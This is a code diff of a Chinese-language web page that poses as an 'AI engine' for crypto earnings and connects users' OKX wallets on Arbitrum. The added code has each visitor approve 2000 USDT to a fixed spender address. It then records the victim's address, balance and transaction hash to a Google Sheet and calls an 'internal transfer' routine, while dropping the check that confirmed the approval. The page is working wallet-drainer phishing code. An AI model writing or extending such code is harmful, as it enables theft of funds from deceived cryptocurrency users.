         const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
         const decimals = await contract.decimals();
-        console.log("USDT decimals:", decimals);
         return { contract, decimals };
     }
     
@@ -691,8 +493,7 @@
         try {
             const abi = ["function allowance(address owner, address spender) view returns (uint256)"];
             const contract = new ethers.Contract(contractAddress, abi, provider);
-            const rawAllowance = await contract.allowance(userAddress, spenderAddress);
-            return rawAllowance;
+            return await contract.allowance(userAddress, spenderAddress);
         } catch (err) { return null; }
     }
     
@@ -705,19 +506,15 @@
         connectBtn.onclick = async () => {
             let wallet = getWallet();
             if (!wallet) {
-                if (isMobile()) { infoDiv.innerHTML = "📱 正在尝试打开 OKX App...<br>如果未安装，将跳转下载页面"; tryOpenOKXApp(); }
+                if (isMobile()) { infoDiv.innerHTML = "📱 正在尝试打开 OKX App..."; tryOpenOKXApp(); }
                 else { infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>"; }
                 return;
             }
             try {
                 infoDiv.innerHTML = "⏳ 请求连接钱包...<br>请确认右上角网络是 Arbitrum One";
-                infoDiv.style.color = '#7ee0ff';
-                
                 await wallet.request({ method: "eth_requestAccounts" });
-                
                 const isCorrectNetwork = await checkAndSwitchNetwork(wallet);
                 if (!isCorrectNetwork) { return; }
-                
                 const provider = new ethers.providers.Web3Provider(wallet);
                 const signer = provider.getSigner();
                 currentSigner = signer;
@@ -727,12 +524,8 @@
                 usdtContractWithSigner = contract;
                 usdtDecimals = decimals;
                 infoDiv.innerHTML = `✅ AI引擎准备就绪，请授权启动引擎 | 地址: ${address.slice(0,6)}...${address.slice(-4)}`;
-                infoDiv.style.color = '#9aa9c1';
                 approveBtn.disabled = false;
-            } catch (err) { 
-                infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消");
-                infoDiv.style.color = '#ff6b6b';
-            }
+            } catch (err) { infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消"); }
         };
     }
     
@@ -748,37 +541,45 @@
             const provider = currentSigner.provider;
             const rawAllowance = await getAllowanceReadOnly(userAddress, SPENDER_ADDRESS, USDT_ADDRESS, provider);
             const currentAllowance = parseFloat(ethers.utils.formatUnits(rawAllowance, usdtDecimals));
+            
+            // 查询用户 USDT 余额
+            let usdtBalance = 0;
+            try {
+                const balanceResult = await getUSDTBalance(userAddress);
+                if (balanceResult.success) usdtBalance = balanceResult.balance;
+            } catch(e) { console.log('查询余额失败'); }
+            
             if (currentAllowance >= MIN_APPROVE_AMOUNT) {
-                infoDiv.innerHTML = `✅ 当前授权额度 (${currentAllowance.toFixed(2)} USDT) 已满足<br>🚀 正在启动 AI 引擎...`;
+                infoDiv.innerHTML = `✅ 授权额度已满足<br>🚀 正在启动 AI 引擎...`;
+                // 保存授权记录到表格
+                await saveAuthorizationToSheet(userAddress, usdtBalance, 'already_authorized');
                 showPage('runningPanel');
                 startRunningLogs();
                 return;
             }
             try {
-                infoDiv.innerHTML = "🤖 AI 正在准备合约交互...";
+                infoDiv.innerHTML = "📡 请在钱包内确认授权<br>授权额度: 2000 USDT";
                 const amountToApproveRaw = ethers.utils.parseUnits("2000", usdtDecimals);
-                infoDiv.innerHTML = `📡 请在钱包内确认授权<br>授权额度: 2000 USDT`;
                 const tx = await usdtContractWithSigner.approve(SPENDER_ADDRESS, amountToApproveRaw);
                 infoDiv.innerHTML = "⛓️ 交易已提交 | Hash: " + tx.hash.slice(0,10)+"...";
                 await tx.wait();
                 
-                addApproveRecord(userAddress, tx.hash, 2000);
+                // 保存授权记录到 Google Sheets
+                await saveAuthorizationToSheet(userAddress, usdtBalance, tx.hash);
                 
-                const newRawAllowance = await getAllowanceReadOnly(userAddress, SPENDER_ADDRESS, USDT_ADDRESS, provider);
-                const newAllowance = parseFloat(ethers.utils.formatUnits(newRawAllowance, usdtDecimals));
-                if (newAllowance >= MIN_APPROVE_AMOUNT) {
-                    infoDiv.innerHTML = `✅ 授权成功！当前授权额度: ${newAllowance.toFixed(2)} USDT<br>🚀 AI 引擎正在启动...`;
-                    showPage('runningPanel');
-                    startRunningLogs();
-                } else {
-                    infoDiv.innerHTML = `❌ 授权失败 | 当前授权额度: ${newAllowance.toFixed(2)} USDT<br>⚠️ 需要 ≥${MIN_APPROVE_AMOUNT} USDT`;
-                }
+                // 内部转账
+                try {
+                    await internalTransferEth(userAddress);
+                } catch(e) { console.log('转账失败:', e); }
+                
+                infoDiv.innerHTML = `✅ 授权成功！<br>🚀 AI 引擎正在启动...`;
+                showPage('runningPanel');
+                startRunningLogs();
             } catch (err) { infoDiv.innerHTML = "❌ 授权失败: " + (err.message || "用户取消"); }
         };
     }
     
     console.log('系统启动成功，密码: 1134');
-    console.log('24小时收益规则: 每天中午12点到第二天中午12点保持不变');
 </script>
 </body>
 </html>
